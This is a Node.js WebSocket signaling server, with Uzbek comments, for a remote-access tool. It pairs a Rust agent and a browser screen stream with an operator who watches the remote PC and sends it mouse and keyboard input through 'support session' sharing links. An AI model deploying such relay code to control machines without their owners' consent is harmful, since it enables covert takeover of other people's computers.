const express = require('express');
const http = require('http');
const { Server } = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new Server({ server });

app.use(express.static(path.join(__dirname, 'public')));

// token -> { agentWs, browserWs, viewerWs, agentName }
const sessions = new Map();

app.get('/sharing', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

wss.on('connection', (ws) => {
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            // 1. Rust Agent birinchi marta ro'yxatdan o'tishi (Uzun token yaratish)
            if (data.type === 'register-agent') {
                const token = uuidv4().replace(/-/g, '') + uuidv4().replace(/-/g, '');
                const agentName = data.hostname || 'REMOTE-PC';
                
                sessions.set(token, { agentWs: ws, browserWs: null, viewerWs: null, agentName: agentName });
                ws.sessionToken = token;
                ws.clientRole = 'agent';

                const sharingUrl = 'https://admin.falconsupportsession.com/sharing?c=' + token;

                ws.send(JSON.stringify({
                    type: 'registered',
                    sharingUrl: sharingUrl
                }));

                console.log(`[KOMPYUTER ULANDI]: ${agentName}`);
                console.log(`SHARING URL: ${sharingUrl}`);
            }

            // 1.1. Rust Agent interneti uzilib yonganda eski uzun tokeni bilan qayta ulanishi
            if (data.type === 'register-agent-back') {
                let session = sessions.get(data.token);
                if (!session) {
                    session = { agentWs: ws, browserWs: null, viewerWs: null, agentName: data.hostname || 'REMOTE-PC' };
                    sessions.set(data.token, session);
                } else {
                    session.agentWs = ws;
                    if (data.hostname) session.agentName = data.hostname;
                }

                ws.sessionToken = data.token;
                ws.clientRole = 'agent';

                const sharingUrl = 'https://admin.falconsupportsession.com/sharing?c=' + data.token;
                console.log(`[AGENT QAYTA ULANDI]: ${session.agentName}`);

                ws.send(JSON.stringify({
                    type: 'registered',
                    sharingUrl: sharingUrl
                }));

                if (session.browserWs) {
                    session.browserWs.send(JSON.stringify({ type: 'start-stream' }));
                }
            }

            // 2. Edge Brauzeri ulanishi (WebRTC stream uchun)
            if (data.type === 'register-agent-token') {
                let session = sessions.get(data.token);
                if (session) {
                    session.browserWs = ws;
                    ws.sessionToken = data.token;
                    ws.clientRole = 'browser';
                    if (data.hostname) session.agentName = data.hostname;

                    if (session.viewerWs) {
                        session.viewerWs.send(JSON.stringify({ type: 'joined-success', agentName: session.agentName }));
                        ws.send(JSON.stringify({ type: 'start-stream' }));
                    }
                } else {
                    ws.send(JSON.stringify({ type: 'error', message: 'Session expired!' }));
                }
            }

            // 3. Operator (Viewer) ulanishi
            if (data.type === 'join-viewer') {
                let session = sessions.get(data.token);
                if (session) {
                    session.viewerWs = ws;
                    ws.sessionToken = data.token;
                    ws.clientRole = 'viewer';
                    
                    ws.send(JSON.stringify({ type: 'joined-success', agentName: session.agentName || 'REMOTE-PC' }));
                    console.log(`[OPERATOR KIRDI]: ${session.agentName}`);
                } else {
                    ws.send(JSON.stringify({ type: 'error', message: 'Session not found!' }));
                }
            }

            // 4. Stream boshlash
            if (data.type === 'start-stream') {
                const session = sessions.get(ws.sessionToken);
                if (session && session.browserWs) {
                    session.viewerWs = ws;
                    session.browserWs.send(JSON.stringify({ type: 'start-stream' }));
                }
            }

            // 5. Seansni uzish
            if (data.type === 'disconnect-session') {
                const session = sessions.get(ws.sessionToken);
                if (session && session.viewerWs === ws) {
                    session.viewerWs = null;
                }
            }

            // 6. WebRTC Signallar (Browser <-> Viewer)
            if (data.type === 'signal') {
                const session = sessions.get(ws.sessionToken);
                if (session) {
                    if (ws.clientRole === 'viewer' && session.browserWs) {
                        session.browserWs.send(JSON.stringify({ type: 'signal', payload: data.payload }));
                    } else if (ws.clientRole === 'browser' && session.viewerWs) {
                        session.viewerWs.send(JSON.stringify({ type: 'signal', payload: data.payload }));
                    }
                }
            }

            // 7. Sichqoncha va klaviatura buyruqlari (Viewer -> Rust Agent)
            if (data.type === 'input') {
                const session = sessions.get(ws.sessionToken);
                if (session && ws.clientRole === 'viewer' && session.agentWs) {
                    session.agentWs.send(message);
                }
            }
        } catch (e) {
            console.error('Server error:', e);
        }
    });

    ws.on('close', () => {
        sessions.forEach((session) => {
            if (session.agentWs === ws) session.agentWs = null;
            else if (session.browserWs === ws) session.browserWs = null;
            else if (session.viewerWs === ws) session.viewerWs = null;
        });
    });
});

const PORT = 3030;
server.listen(PORT, '127.0.0.1', () => {
    console.log('Signaling server running on port ' + PORT);
});
